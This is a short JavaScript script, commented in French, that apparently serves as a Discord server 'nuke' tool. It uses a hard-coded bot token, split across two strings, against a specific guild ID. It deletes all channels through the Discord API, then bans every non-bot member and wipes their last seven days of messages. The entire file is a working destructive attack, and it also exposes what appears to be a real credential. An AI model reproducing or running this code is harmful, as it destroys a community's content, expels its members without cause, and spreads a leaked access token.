const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;
const guild = "1534554643583995936";

async function flashNuke() {
  console.log("démarrage du flash nuke...");

  // 1. supprimer TOUS les salons d'un coup
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (channels.message) {
    console.log("erreur :", channels.message);
    return;
  }

  let delChannels = channels.map(c => fetch(`https://discord.com/api/v9/channels/${c.id}`, {
    method: "DELETE",
    headers: { "Authorization": `Bot ${botToken}` }
  }).catch(() => {}));
  
  await Promise.all(delChannels);
  console.log("salons détruits.");

  // 2. ban tout le monde d'un coup
  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  let banMembers = members.map(m => {
    if (m.user.bot || m.user.id === guild) return Promise.resolve(); 
    return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
      method: "PUT",
      headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({ delete_message_seconds: 604800 })
    }).catch(() => {});
  });
  
  await Promise.all(banMembers);
  console.log("membres bannis.");

  console.log("fin du flash nuke.");
}

flashNuke();